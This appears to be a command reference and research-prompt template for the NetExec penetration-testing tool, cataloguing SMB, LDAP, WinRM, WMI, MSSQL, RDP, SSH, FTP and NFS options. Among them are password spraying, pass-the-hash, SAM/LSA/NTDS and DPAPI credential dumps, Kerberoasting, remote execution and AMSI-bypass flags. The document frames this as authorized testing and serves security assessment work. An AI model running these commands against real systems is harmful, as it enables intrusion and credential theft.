# netexec — command scenarios for deep research

Every netexec (nxc) command form, grouped by protocol. Flags from v1.5.1
(`help*.txt`). NetExec is authorized-testing tooling only.

## How to invoke

```text
@deep-research For NetExec 1.5.1, which SMB actions are safe for a
password-spray engagement, and how do --gfail-limit / --ufail-limit interact
with domain lockout policy? Cite NetExec wiki, source, and AD lockout docs;
return exact flags.
```

---

## Scenario 1 — generic target and credential handling

| # | Command | How to use |
|---|---------|------------|
| 1 | `nxc smb 10.0.0.0/24` | CIDR target |
| 2 | `nxc smb hosts.txt` | Target file |
| 3 | `nxc smb 10.0.0.5-20` | Range |
| 4 | `nxc smb dc01.corp.local` | Hostname/FQDN |
| 5 | `nxc smb scan.xml` | NMap XML input |
| 6 | `nxc smb scan.nessus` | Nessus input |
| 7 | `nxc smb 10.0.0.0/24 --exclude-hosts 10.0.0.1 10.0.0.2` | Exclusions |
| 8 | `nxc smb 10.0.0.0/24 --skip-self` | Skip local machine |
| 9 | `nxc smb 10.0.0.0/24 -u users.txt -p passwords.txt` | User/pass lists |
| 10 | `nxc smb 10.0.0.0/24 -u user -p pass -d CORP` | Domain auth |
| 11 | `nxc smb 10.0.0.0/24 -u user -p pass --local-auth` | Local account auth |
| 12 | `nxc smb 10.0.0.0/24 -u user -H NTHASH` | Pass-the-hash |
| 13 | `nxc smb 10.0.0.0/24 -u user -k` | Kerberos auth |
| 14 | `nxc smb 10.0.0.0/24 -u user -k --use-kcache` | Use cached ticket |
| 15 | `nxc smb 10.0.0.0/24 -u user -k --aesKey KEY` | AES key |
| 16 | `nxc smb 10.0.0.0/24 -u user -k --kdcHost dc01` | Explicit KDC |
| 17 | `nxc smb host -u user -p pass --pfx-cert c.pfx --pfx-pass pass` | Certificate auth |
| 18 | `nxc smb host -u user -p pass --pem-cert c.pem --pem-key k.pem` | PEM auth |
| 19 | `nxc smb 10.0.0.0/24 --no-bruteforce` | Pair users/passwords by line |
| 20 | `nxc smb 10.0.0.0/24 --continue-on-success` | Keep going after a hit |
| 21 | `nxc smb 10.0.0.0/24 --gfail-limit 3 --ufail-limit 3 --fail-limit 3` | Lockout guards |
| 22 | `nxc smb 10.0.0.0/24 -t 10 --jitter 2` | Concurrency + random delay |
| 23 | `nxc smb 10.0.0.0/24 --no-progress --log out.log --verbose` | Output control |
| 24 | `nxc smb 10.0.0.0/24 --debug` | Debug logging |
| 25 | `nxc smb 10.0.0.0/24 -6 --dns-server 10.0.0.53 --dns-tcp --dns-timeout 5` | IPv6 + DNS |
| 26 | `nxc smb -h` | Protocol help |
| 27 | `nxc --version` | Version |

**Research questions**
- Exact lockout semantics of `--gfail-limit`, `--ufail-limit`, `--fail-limit`?
- Does `--jitter` apply per host or per authentication attempt?

**Sources**: NetExec wiki, source, AD account-lockout docs, issues.

**Output**: a credential-testing command that cannot trip a lockout.

---

## Scenario 2 — SMB enumeration and dumping

| # | Command | How to use |
|---|---------|------------|
| 28 | `nxc smb 10.0.0.0/24` | Null-session discovery |
| 29 | `nxc smb host -u user -p pass --shares` | List shares |
| 30 | `nxc smb host -u user -p pass --shares --filter-shares read write` | Filter by access |
| 31 | `nxc smb host -u user -p pass --disks` | Disk list |
| 32 | `nxc smb host -u user -p pass --users` | Domain users |
| 33 | `nxc smb host -u user -p pass --users-export users.txt` | Export users |
| 34 | `nxc smb host -u user -p pass --groups` | Domain groups |
| 35 | `nxc smb host -u user -p pass --local-groups` | Local groups |
| 36 | `nxc smb host -u user -p pass --computers` | Computer accounts |
| 37 | `nxc smb host -u user -p pass --pass-pol` | Password policy |
| 38 | `nxc smb host -u user -p pass --interfaces` | Network interfaces |
| 39 | `nxc smb host -u user -p pass --loggedon-users` | Logged-on users |
| 40 | `nxc smb host -u user -p pass --loggedon-users-filter admin` | Filter logged-on users |
| 41 | `nxc smb host -u user -p pass --smb-sessions` | SMB sessions |
| 42 | `nxc smb host -u user -p pass --reg-sessions` | Registry sessions |
| 43 | `nxc smb host -u user -p pass --qwinsta` | RDP/console sessions |
| 44 | `nxc smb host -u user -p pass --tasklist` | Running processes |
| 45 | `nxc smb host -u user -p pass --rid-brute` | RID cycling |
| 46 | `nxc smb host -u user -p pass --sam` | SAM dump |
| 47 | `nxc smb host -u user -p pass --lsa` | LSA secrets |
| 48 | `nxc smb host -u user -p pass --ntds` | NTDS.dit dump |
| 49 | `nxc smb host -u user -p pass --history` | Password history |
| 50 | `nxc smb host -u user -p pass --dpapi` | DPAPI secrets |
| 51 | `nxc smb host -u user -p pass --sccm` | SCCM secrets |
| 52 | `nxc smb host -u user -p pass --mkfile --pvk key.pvk` | Extract DPAPI master keys |
| 53 | `nxc smb host -u user -p pass --list-snapshots` | Volume snapshots |
| 54 | `nxc smb host -u user -p pass --kerberos-keys` | Kerberos keys |
| 55 | `nxc smb host -u user -p pass --trust-keys` | Trust keys |
| 56 | `nxc smb host -u user -p pass --enabled --user administrator` | Enabled-account check |

**Research questions**
- Which of these write or delete anything on the target?
- How much data does `--ntds`/`--dpapi` move, and how is it stored locally?

**Sources**: NetExec wiki modules/dumping, source, AD security docs.

**Output**: an enumeration ladder from discovery to secrets, each step
justified by authorization.

---

## Scenario 3 — SMB file, spider, and execution actions

| # | Command | How to use |
|---|---------|------------|
| 57 | `nxc smb host -u user -p pass --spider share` | Spider a share |
| 58 | `nxc smb host -u user -p pass --spider share --pattern 'pass'` | Filename pattern |
| 59 | `nxc smb host -u user -p pass --spider share --regex 'passw'` | Regex content match |
| 60 | `nxc smb host -u user -p pass --spider share --content --exclude-dirs tmp` | Content search |
| 61 | `nxc smb host -u user -p pass --spider share --depth 2 --only-files` | Depth + files only |
| 62 | `nxc smb host -u user -p pass --spider share --silent` | Silent spider |
| 63 | `nxc smb host -u user -p pass --put-file local.txt '\\host\share\remote.txt'` | Upload a file |
| 64 | `nxc smb host -u user -p pass --get-file '\\host\share\remote.txt' local.txt` | Download a file |
| 65 | `nxc smb host -u user -p pass --get-folder share ./out --recursive` | Download a folder |
| 66 | `nxc smb host -u user -p pass --get-folder share ./out --no-recursive --ignore-empty-folders` | Non-recursive |
| 67 | `nxc smb host -u user -p pass --append-host` | Append host to hosts file |
| 68 | `nxc smb host -u user -p pass -x 'whoami'` | Execute command |
| 69 | `nxc smb host -u user -p pass -X 'Get-Process'` | Execute PowerShell |
| 70 | `nxc smb host -u user -p pass --exec-method smbexec -x whoami` | Choose exec method |
| 71 | `nxc smb host -u user -p pass --wmi-query 'SELECT * FROM Win32_Process'` | WMI query |
| 72 | `nxc smb host -u user -p pass --wmi-namespace root\\cimv2` | WMI namespace |
| 73 | `nxc smb host -u user -p pass --taskkill /PID 1234` | Kill a process |
| 74 | `nxc smb host -u user -p pass --no-output` | Suppress command output |
| 75 | `nxc smb host -u user -p pass --codec utf-8` | Output codec |
| 76 | `nxc smb host -u user -p pass --obfs --amsi-bypass --clear-obfscripts` | PowerShell obfuscation options |
| 77 | `nxc smb host -u user -p pass --force-ps32 --no-encode` | PS execution tuning |
| 78 | `nxc smb 10.0.0.0/24 --gen-relay-list relay.txt` | Hosts without SMB signing |
| 79 | `nxc smb host -u user -p pass --file-write-check` | Test write access |
| 80 | `nxc smb host -u user -p pass --delegate user2 --spn cifs/host` | S4U delegation |
| 81 | `nxc smb host -u user -p pass --delegate user2 --self` | S4U2Self only |
| 82 | `nxc smb host -u user -p pass --delegate user2 --u2u` | User-to-user |
| 83 | `nxc smb host -u user -p pass --unpac` | UnPAC the hash |
| 84 | `nxc smb host -u user -p pass --generate-st st.kirbi --spn cifs/host` | Save service ticket |
| 85 | `nxc smb host -u user -p pass --generate-tgt tgt.kirbi` | Save TGT |
| 86 | `nxc smb host -u user -p pass --laps` | LAPS password read |
| 87 | `nxc smb host -u user -p pass --share SYSVOL` | Default share for actions |
| 88 | `nxc smb host -u user -p pass --smb-server-port 445 --no-smbv1 --smb-timeout 5` | SMB tuning |
| 89 | `nxc smb host -u user -p pass --no-admin-check` | Skip admin check |
| 90 | `nxc smb host -u user -p pass --generate-hosts-file hosts.txt` | Hosts file from range |
| 91 | `nxc smb host -u user -p pass --generate-krb5-file krb5.conf` | krb5 config from range |

**Research questions**
- Which exec methods leave service/binaries behind, and how are they removed?
- Kerberos ticket formats accepted by `--generate-st`/`--generate-tgt`?

**Sources**: NetExec wiki exec/delegation, Impacket docs, AD CS docs.

**Output**: an execution/spider plan with cleanup and evidence limits.

---

## Scenario 4 — LDAP

| # | Command | How to use |
|---|---------|------------|
| 92 | `nxc ldap dc01 -u user -p pass` | LDAP discovery |
| 93 | `nxc ldap dc01 -u user -p pass --users` | Users |
| 94 | `nxc ldap dc01 -u user -p pass --users-export users.txt` | Export users |
| 95 | `nxc ldap dc01 -u user -p pass --groups` | Groups |
| 96 | `nxc ldap dc01 -u user -p pass --ous` | OUs |
| 97 | `nxc ldap dc01 -u user -p pass --computers` | Computers |
| 98 | `nxc ldap dc01 -u user -p pass --dc-list` | Domain controllers |
| 99 | `nxc ldap dc01 -u user -p pass --get-sid` | Domain SID |
| 100 | `nxc ldap dc01 -u user -p pass --active-users` | Active users |
| 101 | `nxc ldap dc01 -u user -p pass --pass-pol` | Password policy |
| 102 | `nxc ldap dc01 -u user -p pass --pso` | Fine-grained password policies |
| 103 | `nxc ldap dc01 -u user -p pass --asreproast out.txt` | AS-REP roastable users |
| 104 | `nxc ldap dc01 -u user -p pass --kerberoasting out.txt` | Kerberoastable SPNs |
| 105 | `nxc ldap dc01 -u user -p pass --kerberoast-account svc` | Single account |
| 106 | `nxc ldap dc01 -u user -p pass --targeted-kerberoast` | Targeted roast |
| 107 | `nxc ldap dc01 -u user -p pass --no-preauth-targets` | No-preauth accounts |
| 108 | `nxc ldap dc01 -u user -p pass --find-delegation` | Delegation discovery |
| 109 | `nxc ldap dc01 -u user -p pass --trusted-for-delegation` | Trusted-for-delegation |
| 110 | `nxc ldap dc01 -u user -p pass --password-not-required` | Password-not-required |
| 111 | `nxc ldap dc01 -u user -p pass --admin-count` | Admin count |
| 112 | `nxc ldap dc01 -u user -p pass --gmsa` | gMSA accounts |
| 113 | `nxc ldap dc01 -u user -p pass --gmsa-convert-id ID` | Convert gMSA ID |
| 114 | `nxc ldap dc01 -u user -p pass --gmsa-decrypt-lsa blob` | Decrypt gMSA blob |
| 115 | `nxc ldap dc01 -u user -p pass --base-dn 'DC=corp,DC=local'` | Custom base DN |
| 116 | `nxc ldap dc01 -u user -p pass --query '(objectClass=user)'` | Custom LDAP query |
| 117 | `nxc ldap dc01 -u user -p pass --bloodhound -c all` | BloodHound collection |
| 118 | `nxc ldap dc01 -u user -p pass --simple-bind --port 389 --ldap-timeout 5` | Simple bind tuning |
| 119 | `nxc ldap dc01 -u user -p pass --schannel` | Schannel cert auth |

**Research questions**
- Which BloodHound collections are read-only, and what does `all` include?
- Kerberoast output format and cracking assumptions?

**Sources**: NetExec LDAP wiki, BloodHound docs, Kerberos attack papers.

**Output**: a read-only AD map, then roast targets with explicit authorization.

---

## Scenario 5 — WinRM and WMI

| # | Command | How to use |
|---|---------|------------|
| 120 | `nxc winrm host -u user -p pass` | WinRM auth check |
| 121 | `nxc winrm host -u user -p pass -x whoami` | Command execution |
| 122 | `nxc winrm host -u user -p pass -X 'Get-Process'` | PowerShell |
| 123 | `nxc winrm host -u user -p pass --port 5985` | HTTP port |
| 124 | `nxc winrm host -u user -p pass --port 5985 5986` | HTTP + HTTPS pair |
| 125 | `nxc winrm host -u user -p pass --check-proto http` | Only HTTP |
| 126 | `nxc winrm host -u user -p pass --check-proto http https` | Both protocols |
| 127 | `nxc winrm host -u user -p pass --http-timeout 20` | Timeout |
| 128 | `nxc winrm host -u user -p pass --laps` | LAPS |
| 129 | `nxc winrm host -u user -p pass --sam` | SAM dump |
| 130 | `nxc winrm host -u user -p pass --lsa` | LSA dump |
| 131 | `nxc winrm host -u user -p pass --dpapi` | DPAPI |
| 132 | `nxc winrm host -u user -p pass --dump-method sekurlsa` | Dump method |
| 133 | `nxc winrm host -u user -p pass --mkfile --pvk key.pvk` | Master keys |
| 134 | `nxc winrm host -u user -p pass --dir C:\\` | Directory listing |
| 135 | `nxc winrm host -u user -p pass --put-file local.txt C:\\remote.txt` | Upload |
| 136 | `nxc winrm host -u user -p pass --get-file C:\\remote.txt local.txt` | Download |
| 137 | `nxc winrm host -u user -p pass --codec utf-8 --no-output` | Output control |
| 138 | `nxc wmi host -u user -p pass` | WMI auth check |
| 139 | `nxc wmi host -u user -p pass -x whoami` | WMI execution |
| 140 | `nxc wmi host -u user -p pass --wmi-query 'SELECT * FROM Win32_OperatingSystem'` | Query |
| 141 | `nxc wmi host -u user -p pass --wmi-namespace root\\cimv2` | Namespace |
| 142 | `nxc wmi host -u user -p pass --rpc-timeout 5` | RPC timeout |
| 143 | `nxc wmi host -u user -p pass --exec-method wmiexec --exec-timeout 30` | Exec method/timeout |
| 144 | `nxc wmi host -u user -p pass --sam --lsa --ntds --history` | Credential dumps |
| 145 | `nxc wmi host -u user -p pass --dpapi --sccm --mkfile --pvk key.pvk` | DPAPI/SCCM |
| 146 | `nxc wmi host -u user -p pass --list-snapshots --use-snapshot-id 1` | VSS snapshot |
| 147 | `nxc wmi host -u user -p pass --kerberos-keys --enabled --user administrator` | Kerberos/enabled checks |

**Research questions**
- WinRM `--dump-method` options and their OPSEC differences?
- WMI exec artifacts versus WinRM artifacts?

**Sources**: NetExec wiki winrm/wmi, Microsoft WinRM docs, issues.

**Output**: a remote-exec plan with the least-artifact method first.

---

## Scenario 6 — MSSQL

| # | Command | How to use |
|---|---------|------------|
| 148 | `nxc mssql host -u sa -p pass` | Auth check |
| 149 | `nxc mssql host -u sa -p pass -q 'SELECT @@version'` | Query |
| 150 | `nxc mssql host -u sa -p pass --database` | List databases |
| 151 | `nxc mssql host -u sa -p pass --database master` | List tables in a DB |
| 152 | `nxc mssql host -u sa -p pass --port 1433 --mssql-timeout 10` | Port/timeout |
| 153 | `nxc mssql host -u sa -p pass --local-auth` | Local SQL auth |
| 154 | `nxc mssql host -u sa -p pass -x 'whoami'` | OS command execution |
| 155 | `nxc mssql host -u sa -p pass --sam --lsa` | Credential dumps |
| 156 | `nxc mssql host -u sa -p pass --dpapi` | DPAPI |
| 157 | `nxc mssql host -u sa -p pass --mkfile --pvk key.pvk` | Master keys |
| 158 | `nxc mssql host -u sa -p pass --db-hash` | DB user hash dump |
| 159 | `nxc mssql host -u sa -p pass --rid-brute` | RID brute |
| 160 | `nxc mssql host -u sa -p pass --list-backups` | Backup discovery |
| 161 | `nxc mssql host -u sa -p pass --put-file local.txt C:\\remote.txt` | Upload |
| 162 | `nxc mssql host -u sa -p pass --get-file C:\\remote.txt local.txt` | Download |
| 163 | `nxc mssql host -u sa -p pass --force-ps32 --obfs --amsi-bypass --clear-obfscripts --no-encode` | PS tuning |
| 164 | `nxc mssql host -u sa -p pass --no-output` | Suppress output |

**Research questions**
- Which MSSQL features (`xp_cmdshell`, `OLE Automation`) must already be
  enabled for each action?
- Backup-listing risk of reading production data?

**Sources**: NetExec wiki mssql, Microsoft SQL Server docs, issues.

**Output**: a query-first approach before enabling anything.

---

## Scenario 7 — RDP and VNC

| # | Command | How to use |
|---|---------|------------|
| 165 | `nxc rdp host -u user -p pass` | RDP auth check |
| 166 | `nxc rdp host -u user -p pass --nla-screenshot` | Screenshot NLA-disabled login |
| 167 | `nxc rdp host -u user -p pass --screenshot --screentime 5` | Screenshot session |
| 168 | `nxc rdp host -u user -p pass --res 1280x720` | Resolution |
| 169 | `nxc rdp host -u user -p pass --cmd-delay 1` | Command delay |
| 170 | `nxc rdp host -u user -p pass --clipboard-delay 2` | Clipboard delay |
| 171 | `nxc rdp host -u user -p pass --rdp-timeout 10` | Timeout |
| 172 | `nxc vnc host -p pass` | VNC auth check |
| 173 | `nxc vnc host -p pass --screenshot --screentime 3` | Screenshot |
| 174 | `nxc vnc host -p pass --vnc-timeout 10 --vnc-sleep 2` | Timeout + sleep |

**Research questions**
- What does `--nla-screenshot` capture before authentication?
- Rate-limit behavior of VNC auth attempts?

**Sources**: NetExec wiki rdp/vnc, RDP NLA docs, issues.

**Output**: a screenshot workflow that minimizes session footprint.

---

## Scenario 8 — SSH, FTP, NFS

| # | Command | How to use |
|---|---------|------------|
| 175 | `nxc ssh host -u user -p pass` | SSH auth check |
| 176 | `nxc ssh host -u user -p pass -x whoami` | Command execution |
| 177 | `nxc ssh host -u user --key-file id_rsa -p 'passphrase'` | Key auth |
| 178 | `nxc ssh host -u user -p pass --sudo-check` | Sudo rights |
| 179 | `nxc ssh host -u user -p pass --sudo-check-method sudo-stdin` | Sudo method |
| 180 | `nxc ssh host -u user -p pass --get-output-tries 10` | Output retries |
| 181 | `nxc ssh host -u user -p pass --ssh-timeout 20` | Timeout |
| 182 | `nxc ssh host -u user -p pass --put-file local.txt /tmp/remote.txt` | Upload |
| 183 | `nxc ssh host -u user -p pass --get-file /tmp/remote.txt local.txt` | Download |
| 184 | `nxc ssh host -u user -p pass --codec utf-8 --no-output` | Output control |
| 185 | `nxc ftp host -u user -p pass` | FTP auth check |
| 186 | `nxc ftp host -u user -p pass --ls` | List directory |
| 187 | `nxc ftp host -u user -p pass --cat file.txt` | Read a file |
| 188 | `nxc ftp host -u user -p pass --get file.txt` | Download |
| 189 | `nxc ftp host -u user -p pass --put local.txt` | Upload |
| 190 | `nxc ftp host -u anonymous -p anonymous --port 21` | Anonymous check |
| 191 | `nxc nfs host` | NFS export discovery |
| 192 | `nxc nfs host --shares` | List exports |
| 193 | `nxc nfs host --enum-shares` | Enumerate share contents |
| 194 | `nxc nfs host --share /export` | Target a share |
| 195 | `nxc nfs host --ls /export` | List files |
| 196 | `nxc nfs host --cat /export/file.txt` | Read a file |
| 197 | `nxc nfs host --get-file /export/file.txt local.txt` | Download |
| 198 | `nxc nfs host --put-file local.txt /export/remote.txt` | Upload |
| 199 | `nxc nfs host --chmod 755 /export/file.txt` | chmod |
| 200 | `nxc nfs host --nfs-timeout 10 --port 111` | Port/timeout |

**Research questions**
- Does `--sudo-check` run only `sudo -l` or attempt escalation?
- NFS `--chmod` risk and authorization requirements?

**Sources**: NetExec wiki ssh/ftp/nfs, NFS docs, issues.

**Output**: a read-first plan with write actions explicitly gated.

---

## Scenario 9 — modules and multi-protocol options

| # | Command | How to use |
|---|---------|------------|
| 201 | `nxc smb host -L` | List SMB modules |
| 202 | `nxc smb host -M module_name` | Load a module |
| 203 | `nxc smb host -M module_name --options` | Show module options |
| 204 | `nxc ldap host -M module_name -o KEY=VALUE` | Module options inline |
| 205 | `nxc smb host -u user -p pass -M lsassy` | Example credential module |
| 206 | `nxc smb host -u user -p pass -M spider_plus` | Example spider module |

**Research questions**
- Which modules are maintained for nxc 1.5.1, and which are deprecated?
- How are module option values passed and parsed?

**Sources**: NetExec module list, wiki per-module pages, source.

**Output**: a module shortlist with tested options.

---

## Complete flag coverage

| Protocol | Action flags | Scenario |
|----------|--------------|----------|
| generic | `-t`, `--jitter`, `--exclude-hosts`, `--skip-self`, `--no-progress`, `--log`, `--verbose`, `--debug`, `-6`, `--dns-server`, `--dns-tcp`, `--dns-timeout`, `-u`, `-p`, `--no-bruteforce`, `--continue-on-success`, `--gfail-limit`, `--ufail-limit`, `--fail-limit`, `-k`, `--use-kcache`, `--aesKey`, `--kdcHost`, `--pfx-cert`, `--pfx-base64`, `--pfx-pass`, `--pem-cert`, `--pem-key`, `-M`, `-L`, `--options` | 1, 9 |
| smb | `-H`, `--delegate`, `--spn`, `--generate-st`, `--self`, `--u2u`, `--unpac`, `-d`, `--local-auth`, `--port`, `--share`, `--smb-server-port`, `--no-smbv1`, `--no-admin-check`, `--gen-relay-list`, `--smb-timeout`, `--laps`, `--generate-hosts-file`, `--generate-krb5-file`, `--sam`, `--lsa`, `--ntds`, `--history`, `--kerberos-keys`, `--enabled`, `--user`, `--trust-keys`, `--just-trust-keys`, `--dpapi`, `--sccm`, `--mkfile`, `--pvk`, `--list-snapshots`, `--shares`, `--exclude-shares`, `--dir`, `--interfaces`, `--file-write-check`, `--filter-shares`, `--disks`, `--users`, `--users-export`, `--groups`, `--local-groups`, `--computers`, `--pass-pol`, `--rid-brute`, `--smb-sessions`, `--reg-sessions`, `--loggedon-users`, `--loggedon-users-filter`, `--qwinsta`, `--tasklist`, `--taskkill`, `--wmi-query`, `--wmi-namespace`, `--spider`, `--spider-folder`, `--content`, `--exclude-dirs`, `--depth`, `--only-files`, `--silent`, `--pattern`, `--regex`, `--put-file`, `--get-file`, `--get-folder`, `--recursive`, `--no-recursive`, `--ignore-empty-folders`, `--append-host`, `--exec-method`, `--dcom-timeout`, `--get-output-tries`, `--codec`, `--no-output`, `--obfs`, `--amsi-bypass`, `--clear-obfscripts`, `--force-ps32`, `--no-encode` | 2, 3 |
| ldap | `-H`, `--simple-bind`, `--port`, `--ldap-timeout`, `--schannel`, `-d`, `--asreproast`, `--kerberoasting`, `--kerberoast`, `--kerberoast-account`, `--targeted-kerberoast`, `--no-preauth-targets`, `--base-dn`, `--query`, `--find-delegation`, `--trusted-for-delegation`, `--password-not-required`, `--admin-count`, `--users`, `--users-export`, `--groups`, `--ous`, `--computers`, `--dc-list`, `--get-sid`, `--active-users`, `--pso`, `--pass-pol`, `--gmsa`, `--gmsa-convert-id`, `--gmsa-decrypt-lsa`, `--bloodhound`, `-c`/`--collection` | 4 |
| mssql | `-H`, `--port`, `--mssql-timeout`, `-q`/`--query`, `--database`, `--local-auth`, `--sam`, `--lsa`, `--dpapi`, `--mkfile`, `--pvk`, `--db-hash`, `--no-output`, `--force-ps32`, `--obfs`, `--amsi-bypass`, `--clear-obfscripts`, `--no-encode`, `--put-file`, `--get-file`, `--rid-brute`, `--list-backups` | 6 |
| winrm | `-H`, `--port`, `--check-proto`, `--laps`, `--http-timeout`, `--local-auth`, `--dump-method`, `--sam`, `--lsa`, `--dpapi`, `--mkfile`, `--pvk`, `--dir`, `--put-file`, `--get-file`, `--codec`, `--no-output` | 5 |
| wmi | `-H`, `--port`, `--rpc-timeout`, `--local-auth`, `--dpapi`, `--sccm`, `--mkfile`, `--pvk`, `--list-snapshots`, `--use-snapshot-id`, `--sam`, `--lsa`, `--ntds`, `--history`, `--kerberos-keys`, `--enabled`, `--user`, `--wmi-query`, `--wmi-namespace`, `--get-file`, `--append-host`, `--no-output`, `--exec-method`, `--exec-timeout`, `--codec` | 5 |
| rdp | `-H`, `--port`, `--rdp-timeout`, `--nla-screenshot`, `--local-auth`, `--screenshot`, `--screentime`, `--res`, `--cmd-delay`, `--clipboard-delay`, `--no-output` | 7 |
| vnc | `--port`, `--vnc-timeout`, `--vnc-sleep`, `--screenshot`, `--screentime` | 7 |
| ssh | `--key-file`, `--port`, `--ssh-timeout`, `--sudo-check`, `--sudo-check-method`, `--get-output-tries`, `--put-file`, `--get-file`, `--codec`, `--no-output` | 8 |
| ftp | `--port`, `--ls`, `--cat`, `--get`, `--put` | 8 |
| nfs | `--port`, `--nfs-timeout`, `--share`, `--shares`, `--enum-shares`, `--ls`, `--cat`, `--get-file`, `--put-file`, `--chmod` | 8 |

Full per-flag text: [`help.txt`](help.txt) and `help-<protocol>.txt`.
